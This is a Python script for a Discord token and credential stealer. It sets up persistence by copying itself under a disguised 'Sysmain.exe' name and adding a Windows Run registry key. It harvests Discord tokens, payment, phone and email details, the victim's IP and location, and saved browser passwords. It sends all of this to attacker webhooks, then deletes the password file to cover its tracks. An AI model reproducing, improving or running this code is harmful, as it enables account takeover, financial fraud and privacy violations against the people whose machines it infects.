import os
import discord_webhook
from json import loads
import shutil
from urllib.request import urlopen, Request
import TokenSteal
import winreg


# Now we do a little trolling shhh..

def infloop():
    path = os.getenv("APPDATA") + "\\Microsoft\\Credentials" + '\\Sysmain.exe'
    regKey = 'Software\Microsoft\Windows\CurrentVersion\Run'
    if os.path.isfile(path) and os.access(path, os.F_OK):
        shutil.copyfile(__file__, path)
    try:
        RegisKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, regKey, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(RegisKey, path, 0, winreg.REG_SZ)
        winreg.CloseKey(RegisKey)
    except:
        pass


if __name__ == '__main__':
    infloop()
    Script = TokenSteal.TokenStealer()
    #discord-tokens
    DiscordVictim = ""
    #sends-discord-tokens
    for token in Script.checkedTokens():
        user_data = Script.getuserdata(token)
        username = user_data["username"] + "#" + str(user_data["discriminator"])
        DiscordVictim = user_data["username"]
        avatar_url = Script.getavatar(user_data["id"], user_data["avatar"])
        billing = bool(Script.has_payment_methods(user_data))
        nitro = bool(user_data.get("premium_type"))
        theDiscord = discord_webhook.DiscordEmbed(
            title=F"HACKED DISCORD: ***{username}***",
            color="ff0000"
        )
        theDiscord.set_thumbnail(url=avatar_url)
        theDiscord.add_embed_field(name="DISCORD Token", value=f"{token}", inline=False)
        theDiscord.add_embed_field(name="Attached Credit: ", value=str(billing), inline=False)
        theDiscord.add_embed_field(name="Nitro: ", value=str(nitro), inline=False)
        theDiscord.add_embed_field(name="Phone:", value=user_data.get("phone"), inline=True)
        theDiscord.add_embed_field(name="Email:", value=user_data.get("email"), inline=True)
        Script.webhook.add_embed(theDiscord)
        response = Script.webhook.execute()

    try:
        ipinfo = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        ip = loads(urlopen(Request(f'http://extreme-ip-lookup.com/json/{ipinfo}')).read().decode())
    except:
        pass

    embed = discord_webhook.DiscordEmbed(
        title= f"***VICTIM's Account***: {os.getlogin()}",
        color= "ff0000"
    )

    embed.add_embed_field(name="IP Address", value=ip["query"], inline=True)
    embed.add_embed_field(name="Internet Provider", value=ip["isp"], inline=False)
    embed.add_embed_field(name="City", value=ip["city"], inline=True)
    embed.add_embed_field(name="Country", value=ip["country"], inline=True)
    Script.webhook2.add_embed(embed)
    with open(Script.browserPassword(), "rb") as n:
        Script.webhook2.add_file(file=n.read(), filename=f"{DiscordVictim} pass.txt")
    response = Script.webhook2.execute()

    try:
        os.remove(Script.browserPassword())
    except:
        pass